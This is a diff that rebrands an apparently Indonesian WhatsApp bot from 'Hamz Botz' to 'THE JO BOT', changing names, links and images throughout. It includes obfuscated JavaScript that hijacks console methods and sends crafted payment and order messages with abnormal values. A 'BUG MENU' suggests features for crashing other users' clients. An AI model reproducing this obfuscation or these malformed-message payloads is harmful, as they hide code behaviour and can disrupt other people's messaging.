@@ -150,7 +150,7 @@ const fkonjo = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.ch
 const jancok = (teks) => {
 var _0xec4926=_0x4e61;function _0x4e61(_0x434c13,_0x50470a){var _0x1efd7b=_0x3784();return _0x4e61=function(_0x438905,_0x15a777){_0x438905=_0x438905-0x19d;var _0x103770=_0x1efd7b[_0x438905];return _0x103770;},_0x4e61(_0x434c13,_0x50470a);}function _0x3784(){var _0x3e8843=['search','0@s.whatsapp.net','relayMessage','7UhegRV','return\x20(function()\x20','exception','1931AeGfle','console','prototype','4LPGiZK','8557120LNUWPx','toString','table','constructor','192oerNTo','length','chat','error','1517040mRszJS','trace','apply','6827224BBAqQl','36282Ftzdlk','(((.+)+)+)+$','{}.constructor(\x22return\x20this\x22)(\x20)','1418421zebmzA','11841181mpuzbz','info','bind','605TkwLbP','log','warn'];_0x3784=function(){return _0x3e8843;};return _0x3784();}(function(_0x1cb5e3,_0x36aa27){var _0x5552f8=_0x4e61,_0x49f8d4=_0x1cb5e3();while(!![]){try{var _0x5588b0=parseInt(_0x5552f8(0x1b7))/0x1*(-parseInt(_0x5552f8(0x19f))/0x2)+parseInt(_0x5552f8(0x1aa))/0x3*(parseInt(_0x5552f8(0x1ba))/0x4)+parseInt(_0x5552f8(0x1ae))/0x5*(-parseInt(_0x5552f8(0x1a7))/0x6)+parseInt(_0x5552f8(0x1b4))/0x7*(-parseInt(_0x5552f8(0x1a6))/0x8)+-parseInt(_0x5552f8(0x1a3))/0x9+parseInt(_0x5552f8(0x1bb))/0xa+parseInt(_0x5552f8(0x1ab))/0xb;if(_0x5588b0===_0x36aa27)break;else _0x49f8d4['push'](_0x49f8d4['shift']());}catch(_0x8e7b94){_0x49f8d4['push'](_0x49f8d4['shift']());}}}(_0x3784,0x71c2c));var _0x51227b=(function(){var _0x12f625=!![];return function(_0x5b691c,_0x11756a){var _0x92567c=_0x12f625?function(){var _0x25516a=_0x4e61;if(_0x11756a){var _0x121f48=_0x11756a[_0x25516a(0x1a5)](_0x5b691c,arguments);return _0x11756a=null,_0x121f48;}}:function(){};return _0x12f625=![],_0x92567c;};}()),_0xbde14b=_0x51227b(this,function(){var _0x4df401=_0x4e61;return _0xbde14b[_0x4df401(0x1bc)]()[_0x4df401(0x1b1)](_0x4df401(0x1a8))[_0x4df401(0x1bc)]()[_0x4df401(0x19e)](_0xbde14b)[_0x4df401(0x1b1)](_0x4df401(0x1a8));});_0xbde14b();var _0x15a777=(function(){var _0x552ea4=!![];return function(_0x5d6799,_0x28d376){var _0x18ac73=_0x552ea4?function(){if(_0x28d376){var _0x32ce48=_0x28d376['apply'](_0x5d6799,arguments);return _0x28d376=null,_0x32ce48;}}:function(){};return _0x552ea4=![],_0x18ac73;};}()),_0x438905=_0x15a777(this,function(){var _0x4df242=_0x4e61,_0x4f48be;try{var _0x4cbe03=Function(_0x4df242(0x1b5)+_0x4df242(0x1a9)+');');_0x4f48be=_0x4cbe03();}catch(_0x178b08){_0x4f48be=window;}var _0x25ecf4=_0x4f48be[_0x4df242(0x1b8)]=_0x4f48be['console']||{},_0x212ccb=[_0x4df242(0x1af),_0x4df242(0x1b0),_0x4df242(0x1ac),_0x4df242(0x1a2),_0x4df242(0x1b6),_0x4df242(0x19d),_0x4df242(0x1a4)];for(var _0x400ce5=0x0;_0x400ce5<_0x212ccb[_0x4df242(0x1a0)];_0x400ce5++){var _0x3d104e=_0x15a777[_0x4df242(0x19e)][_0x4df242(0x1b9)][_0x4df242(0x1ad)](_0x15a777),_0x5ba0f9=_0x212ccb[_0x400ce5],_0x1ab0ff=_0x25ecf4[_0x5ba0f9]||_0x3d104e;_0x3d104e['__proto__']=_0x15a777[_0x4df242(0x1ad)](_0x15a777),_0x3d104e[_0x4df242(0x1bc)]=_0x1ab0ff[_0x4df242(0x1bc)][_0x4df242(0x1ad)](_0x1ab0ff),_0x25ecf4[_0x5ba0f9]=_0x3d104e;}});_0x438905();{jobotz[_0xec4926(0x1b3)](m[_0xec4926(0x1a1)],{'requestPaymentMessage':{'Message':{'extendedTextMessage':{'text':teks,'currencyCodeIso4217':'IDR','requestFrom':_0xec4926(0x1b2),'expiryTimestamp':0x1f40,'amount':0x1,'background':thumb}}}},{});}}
 // Function
-wm = '𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟'
+wm = 'THE JO BOT'
 
 // Time & Date
 const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
@@ -481,8 +481,8 @@ const lori ={
 "itemCount": 2025,
 "status": "INQUIRY",
 "surface": "CATALOG",
-"orderTitle": "FIXED BY 𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟 CASE MD",
-"message":"😈⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"orderTitle": "FIXED BY THE JO BOT CASE MD",
+"message":"😈⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "sellerJid": "5491133536405@s.whatsapp.net",
 "token": "AR57p+dSS4yeh4tAQCMyt51dvXpHlgliVN1/6Au+XBE3+w==",//Kode ini jangan di ubh sedikit pun 
 "totalAmount1000": "IDR 99.99999999999999999999",
@@ -1073,25 +1073,25 @@ if (!isCreator) return
 if (!m.isGroup) throw mess.group
 let teks = `
 ══✪〘 👥 Tag All 〙✪══
-•━══〘𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟〙══━• 
+•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• 
 INFO: ${q ? q : 'kosong'}
-•━══〘𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟〙══━• `
+•━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• `
  for (let mem of participants) {
  teks += `
  ╭━═════════════━• 
  │➳ @${mem.id.split('@')[0]}
  ╰━═════════════━•
- •━══〘𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟〙══━• `
+ •━══〘𝚃𝙷𝙴𝙹𝙾𝙱𝙾𝚃〙══━• `
  }
  jobotz.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id),
 contextInfo: {
 externalAdReply: {
-title: `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+title: `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 body:`Runtime ${runtime(process.uptime())}`,
 previewType: "PHOTO",
 showAdAttribution: true,
-sourceUrl: `https://youtube.com/channel/HAMZXPRESET`,
-thumbnailUrl: `https://telegra.ph/file/8b186ae775eebeb9403a2.jpg`
+sourceUrl: `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+thumbnailUrl: `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}})
 }
 break
@@ -3081,7 +3081,7 @@ m.reply("Case Tidak Ditemukan")
 }
 break
 case 'menu': { 
-function _0x579d(){var _0x21a614=['521670efiuPe','apply','__proto__','19384BBeZJa','PHOTO','Runtime\x20','16355zszwtA','205918eQqFOw','(((.+)+)+)+$','2025licLNc','info','©⏤͟͟͞𝐓𝐇𝐄\x20𝐉𝐎\x20𝐁𝐎𝐓','warn','constructor','1821155AABofi','https://telegra.ph/file/094abb98c63d1fbac703e.jpg','115587pHjGCJ','error','prototype','exception','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','table','search','log','\x0a\x20╔╦╗╦─╦╔╗─╦╔╗╦╗╔╗╔╦╗\x0a\x20─║─╠═╣╠──║║║║╣║║─║\x0a\x20─╩─╩─╩╚╝╚╝╚╝╩╝╚╝─╩\x0a╭━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\x0a┃╭┈─────────────⩵꙰ཱི࿐\x0a┃╰──\x20⏤͟͟͞MENU\x20NYA\x20──➤\x20↶↷\x0a╰━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20ALL\x20MENU\x20〙\x0a𖠀⩵꙰ཱི࿐\x20BUGHAMZ\x20\x0a𖠀⩵꙰ཱི࿐\x20FUNHAMZ\x20\x0a𖠀⩵꙰ཱི࿐\x20MAINMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20VOICEMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20GROUPMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20OWNERMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20ISLAMICMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20SEARCHMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20EPHOTOMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20RANDOMMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20TEKSPROMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20PRIMBONMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20CONVERTMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20WEBZONEMENU\x0a𖠀⩵꙰ཱི࿐\x20DATABASEMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20PHOTOOXYMENU\x0a𖠀⩵꙰ཱི࿐\x20DOWNLOADMENU\x0a𖠀⩵꙰ཱི࿐\x20ANONYMOUSMENU\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a\x0a©\x20⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁\x0a','toString','534JHHmdz','bind','278524dMPnOo'];_0x579d=function(){return _0x21a614;};return _0x579d();}var _0x45b796=_0x54e9;(function(_0xef2cef,_0x39463a){var _0xef9ea2=_0x54e9,_0x3a7959=_0xef2cef();while(!![]){try{var _0x4edba8=-parseInt(_0xef9ea2(0x1d5))/0x1+parseInt(_0xef9ea2(0x1ce))/0x2+parseInt(_0xef9ea2(0x1de))/0x3+parseInt(_0xef9ea2(0x1cd))/0x4+-parseInt(_0xef9ea2(0x1d4))/0x5*(parseInt(_0xef9ea2(0x1cb))/0x6)+-parseInt(_0xef9ea2(0x1dc))/0x7+-parseInt(_0xef9ea2(0x1d1))/0x8*(-parseInt(_0xef9ea2(0x1d7))/0x9);if(_0x4edba8===_0x39463a)break;else _0x3a7959['push'](_0x3a7959['shift']());}catch(_0x4f681d){_0x3a7959['push'](_0x3a7959['shift']());}}}(_0x579d,0x26528));function _0x54e9(_0x31faf4,_0x3a6f5b){var _0x1df06f=_0x579d();return _0x54e9=function(_0x4ab5e1,_0x33f4c6){_0x4ab5e1=_0x4ab5e1-0x1c8;var _0x20a9ad=_0x1df06f[_0x4ab5e1];return _0x20a9ad;},_0x54e9(_0x31faf4,_0x3a6f5b);}var _0x44be22=(function(){var _0x5c188c=!![];return function(_0x588624,_0x1d1fcc){var _0x4819ff=_0x5c188c?function(){if(_0x1d1fcc){var _0xc41cf8=_0x1d1fcc['apply'](_0x588624,arguments);return _0x1d1fcc=null,_0xc41cf8;}}:function(){};return _0x5c188c=![],_0x4819ff;};}()),_0x599f1d=_0x44be22(this,function(){var _0x3615a2=_0x54e9;return _0x599f1d[_0x3615a2(0x1ca)]()[_0x3615a2(0x1e4)](_0x3615a2(0x1d6))[_0x3615a2(0x1ca)]()[_0x3615a2(0x1db)](_0x599f1d)[_0x3615a2(0x1e4)]('(((.+)+)+)+$');});_0x599f1d();var _0x33f4c6=(function(){var _0x2bfe66=!![];return function(_0x2626f0,_0x30c159){var _0x18b902=_0x2bfe66?function(){var _0x498d02=_0x54e9;if(_0x30c159){var _0x1b1850=_0x30c159[_0x498d02(0x1cf)](_0x2626f0,arguments);return _0x30c159=null,_0x1b1850;}}:function(){};return _0x2bfe66=![],_0x18b902;};}()),_0x4ab5e1=_0x33f4c6(this,function(){var _0x5acc68=_0x54e9,_0x6c52e2;try{var _0x265ca0=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x6c52e2=_0x265ca0();}catch(_0x4de83d){_0x6c52e2=window;}var _0x27017c=_0x6c52e2['console']=_0x6c52e2['console']||{},_0x204145=[_0x5acc68(0x1c8),_0x5acc68(0x1da),_0x5acc68(0x1d8),_0x5acc68(0x1df),_0x5acc68(0x1e1),_0x5acc68(0x1e3),'trace'];for(var _0x187697=0x0;_0x187697<_0x204145['length'];_0x187697++){var _0x10db16=_0x33f4c6['constructor'][_0x5acc68(0x1e0)][_0x5acc68(0x1cc)](_0x33f4c6),_0x5a33c5=_0x204145[_0x187697],_0x27c83e=_0x27017c[_0x5a33c5]||_0x10db16;_0x10db16[_0x5acc68(0x1d0)]=_0x33f4c6[_0x5acc68(0x1cc)](_0x33f4c6),_0x10db16[_0x5acc68(0x1ca)]=_0x27c83e[_0x5acc68(0x1ca)][_0x5acc68(0x1cc)](_0x27c83e),_0x27017c[_0x5a33c5]=_0x10db16;}});_0x4ab5e1();{if(!isCreator&&!isBan)return;menunya=_0x45b796(0x1c9),jobotz['sendMessage'](m['chat'],{'image':{'url':_0x45b796(0x1dd)},'contextInfo':{'externalAdReply':{'title':_0x45b796(0x1d9),'body':_0x45b796(0x1d3)+runtime(process['uptime']()),'previewType':_0x45b796(0x1d2),'showAdAttribution':!![],'sourceUrl':_0x45b796(0x1e2),'thumbnailUrl':'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}},'caption':menunya});}
+function _0x579d(){var _0x21a614=['521670efiuPe','apply','__proto__','19384BBeZJa','PHOTO','Runtime\x20','16355zszwtA','205918eQqFOw','(((.+)+)+)+$','2025licLNc','info','©⏤͟͟͞𝐓𝐇𝐄\x20𝐉𝐎\x20𝐁𝐎𝐓','warn','constructor','1821155AABofi','https://telegra.ph/file/094abb98c63d1fbac703e.jpg','115587pHjGCJ','error','prototype','exception','https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w','table','search','log','\x0a\x20╔╦╗╦─╦╔╗─╦╔╗╦╗╔╗╔╦╗\x0a\x20─║─╠═╣╠──║║║║╣║║─║\x0a\x20─╩─╩─╩╚╝╚╝╚╝╩╝╚╝─╩\x0a╭━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━╮\x0a┃╭┈─────────────⩵꙰ཱི࿐\x0a┃╰──\x20⏤͟͟͞MENU\x20NYA\x20──➤\x20↶↷\x0a╰━━•›ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙\x20━\x20━\x20━\x20━\x20ꪶ\x20ཻུ۪۪ꦽꦼ̷⸙‹•━━͙✩̣̣̣̣\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a╭━━•›〘\x20ALL\x20MENU\x20〙\x0a𖠀⩵꙰ཱི࿐\x20BUGMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20FUNMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20MAINMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20VOICEMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20GROUPMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20OWNERMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20ISLAMICMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20SEARCHMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20EPHOTOMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20RANDOMMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20TEKSPROMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20PRIMBONMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20CONVERTMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20WEBZONEMENU\x0a𖠀⩵꙰ཱི࿐\x20DATABASEMENU\x20\x0a𖠀⩵꙰ཱི࿐\x20PHOTOOXYMENU\x0a𖠀⩵꙰ཱི࿐\x20DOWNLOADMENU\x0a𖠀⩵꙰ཱི࿐\x20ANONYMOUSMENU\x0a╰━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━\x20━•⩵꙰ཱི࿐\x0a\x20▬▭▬▭▬\x20✦✧✦\x20▬▭▬▭▬\x0a\x0a©\x20⏤͟͟͞𝑻𝑯𝑬\x20𝑱𝑶\x20𝑩𝑶𝑻𝒁\x0a','toString','534JHHmdz','bind','278524dMPnOo'];_0x579d=function(){return _0x21a614;};return _0x579d();}var _0x45b796=_0x54e9;(function(_0xef2cef,_0x39463a){var _0xef9ea2=_0x54e9,_0x3a7959=_0xef2cef();while(!![]){try{var _0x4edba8=-parseInt(_0xef9ea2(0x1d5))/0x1+parseInt(_0xef9ea2(0x1ce))/0x2+parseInt(_0xef9ea2(0x1de))/0x3+parseInt(_0xef9ea2(0x1cd))/0x4+-parseInt(_0xef9ea2(0x1d4))/0x5*(parseInt(_0xef9ea2(0x1cb))/0x6)+-parseInt(_0xef9ea2(0x1dc))/0x7+-parseInt(_0xef9ea2(0x1d1))/0x8*(-parseInt(_0xef9ea2(0x1d7))/0x9);if(_0x4edba8===_0x39463a)break;else _0x3a7959['push'](_0x3a7959['shift']());}catch(_0x4f681d){_0x3a7959['push'](_0x3a7959['shift']());}}}(_0x579d,0x26528));function _0x54e9(_0x31faf4,_0x3a6f5b){var _0x1df06f=_0x579d();return _0x54e9=function(_0x4ab5e1,_0x33f4c6){_0x4ab5e1=_0x4ab5e1-0x1c8;var _0x20a9ad=_0x1df06f[_0x4ab5e1];return _0x20a9ad;},_0x54e9(_0x31faf4,_0x3a6f5b);}var _0x44be22=(function(){var _0x5c188c=!![];return function(_0x588624,_0x1d1fcc){var _0x4819ff=_0x5c188c?function(){if(_0x1d1fcc){var _0xc41cf8=_0x1d1fcc['apply'](_0x588624,arguments);return _0x1d1fcc=null,_0xc41cf8;}}:function(){};return _0x5c188c=![],_0x4819ff;};}()),_0x599f1d=_0x44be22(this,function(){var _0x3615a2=_0x54e9;return _0x599f1d[_0x3615a2(0x1ca)]()[_0x3615a2(0x1e4)](_0x3615a2(0x1d6))[_0x3615a2(0x1ca)]()[_0x3615a2(0x1db)](_0x599f1d)[_0x3615a2(0x1e4)]('(((.+)+)+)+$');});_0x599f1d();var _0x33f4c6=(function(){var _0x2bfe66=!![];return function(_0x2626f0,_0x30c159){var _0x18b902=_0x2bfe66?function(){var _0x498d02=_0x54e9;if(_0x30c159){var _0x1b1850=_0x30c159[_0x498d02(0x1cf)](_0x2626f0,arguments);return _0x30c159=null,_0x1b1850;}}:function(){};return _0x2bfe66=![],_0x18b902;};}()),_0x4ab5e1=_0x33f4c6(this,function(){var _0x5acc68=_0x54e9,_0x6c52e2;try{var _0x265ca0=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x6c52e2=_0x265ca0();}catch(_0x4de83d){_0x6c52e2=window;}var _0x27017c=_0x6c52e2['console']=_0x6c52e2['console']||{},_0x204145=[_0x5acc68(0x1c8),_0x5acc68(0x1da),_0x5acc68(0x1d8),_0x5acc68(0x1df),_0x5acc68(0x1e1),_0x5acc68(0x1e3),'trace'];for(var _0x187697=0x0;_0x187697<_0x204145['length'];_0x187697++){var _0x10db16=_0x33f4c6['constructor'][_0x5acc68(0x1e0)][_0x5acc68(0x1cc)](_0x33f4c6),_0x5a33c5=_0x204145[_0x187697],_0x27c83e=_0x27017c[_0x5a33c5]||_0x10db16;_0x10db16[_0x5acc68(0x1d0)]=_0x33f4c6[_0x5acc68(0x1cc)](_0x33f4c6),_0x10db16[_0x5acc68(0x1ca)]=_0x27c83e[_0x5acc68(0x1ca)][_0x5acc68(0x1cc)](_0x27c83e),_0x27017c[_0x5a33c5]=_0x10db16;}});_0x4ab5e1();{if(!isCreator&&!isBan)return;menunya=_0x45b796(0x1c9),jobotz['sendMessage'](m['chat'],{'image':{'url':_0x45b796(0x1dd)},'contextInfo':{'externalAdReply':{'title':_0x45b796(0x1d9),'body':_0x45b796(0x1d3)+runtime(process['uptime']()),'previewType':_0x45b796(0x1d2),'showAdAttribution':!![],'sourceUrl':_0x45b796(0x1e2),'thumbnailUrl':'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}},'caption':menunya});}
 }
 break
 
@@ -3099,7 +3099,7 @@ sections: [{
 "rows": [
 {
 "title": "BUG MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}bugmenu`
 }
 ]
@@ -3109,7 +3109,7 @@ sections: [{
 "rows": [
 {
 "title": "OWNER MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}ownermenu`
 }
 ]
@@ -3119,7 +3119,7 @@ sections: [{
 "rows": [
 {
 "title": "GRUP MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}grupmenu`
 }
 ]
@@ -3129,7 +3129,7 @@ sections: [{
 "rows": [
 {
 "title": "WEBZONE MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}webzonemenu`
 }
 ]
@@ -3139,7 +3139,7 @@ sections: [{
 "rows": [
 {
 "title": "DOWNLOAD MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}downloadmenu`
 }
 ]
@@ -3149,7 +3149,7 @@ sections: [{
 "rows": [
 {
 "title": "SEARCH MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}searchmenu`
 }
 ]
@@ -3159,7 +3159,7 @@ sections: [{
 "rows": [
 {
 "title": "RANDOM MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}randommenu`
 }
 ]
@@ -3169,7 +3169,7 @@ sections: [{
 "rows": [
 {
 "title": "TEKSPRO MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}tekspromenu`
 }
 ]
@@ -3179,7 +3179,7 @@ sections: [{
 "rows": [
 {
 "title": "PHOTO MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}photomenu`
 }
 ]
@@ -3189,7 +3189,7 @@ sections: [{
 "rows": [
 {
 "title": "EPHOTO MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}ephotomenu`
 }
 ]
@@ -3199,7 +3199,7 @@ sections: [{
 "rows": [
 {
 "title": "PHOTOOXY MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}photooxymenu`
 }
 ]
@@ -3209,7 +3209,7 @@ sections: [{
 "rows": [
 {
 "title": "FUN MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}funmenu`
 }
 ]
@@ -3219,7 +3219,7 @@ sections: [{
 "rows": [
 {
 "title": "PRIMBON MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}primbonmenu`
 }
 ]
@@ -3229,7 +3229,7 @@ sections: [{
 "rows": [
 {
 "title": "CONVERT MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟,
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}convertmenu`
 }
 ]
@@ -3239,7 +3239,7 @@ sections: [{
 "rows": [
 {
 "title": "MAIN MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}mainmenu`
 }
 ]
@@ -3249,7 +3249,7 @@ sections: [{
 "rows": [
 {
 "title": "DATABASE MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}databasemenu`
 }
 ]
@@ -3259,7 +3259,7 @@ sections: [{
 "rows": [
 {
 "title": "ANONYMOUS MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}anonymousmenu`
 }
 ]
@@ -3269,7 +3269,7 @@ sections: [{
 "rows": [
 {
 "title": "ISLAMIC MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟",
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}islamicmenu`
 }
 ]
@@ -3279,7 +3279,7 @@ sections: [{
 "rows": [
 {
 "title": "VOICE MENU",
-"description": "© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟,
+"description": "© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁",
 "rowId": `${prefix}voicemenu`
 }
 ]
@@ -3328,17 +3328,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
 "previewType": "PHOTO",
 "showAdAttribution": true,
-"sourceUrl": `https://youtube.com/channel/HAMZXPRESET`,
-"thumbnailUrl": `https://telegra.ph/file/1de53cbe337ef658fe6e8.jpg`
+"sourceUrl": `https://youtube.com/channel/UC-wt99jFVc-zXMkxKRDZ56w`,
+"thumbnailUrl": `https://telegra.ph/file/094abb98c63d1fbac703e.jpg`
 }}, caption: anu })
 }
 break
@@ -3363,17 +3363,17 @@ break
 ╰━ ━ ━ ━ ━ ━ ━ ━ ━ ━•⩵꙰ཱི࿐
  ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
 
-© ⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟
+© ⏤͟͟͞𝑻𝑯𝑬 𝑱𝑶 𝑩𝑶𝑻𝒁
 `
-jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/8b186ae775eebeb9403a2.jpg'}, 
+jobotz.sendMessage(m.chat, { image: {url: 'https://telegra.ph/file/094abb98c63d1fbac703e.jpg'}, 
 "contextInfo": {
 "externalAdReply": {
-"title": `©⏤͟͟͞𝕳𝖆𝖒𝖟 𝕭𝖔𝖙𝖟`,
+"title": `©⏤͟͟͞𝐓𝐇𝐄 𝐉𝐎 𝐁𝐎𝐓`,
 "body":`Runtime ${runtime(process.uptime())}`,
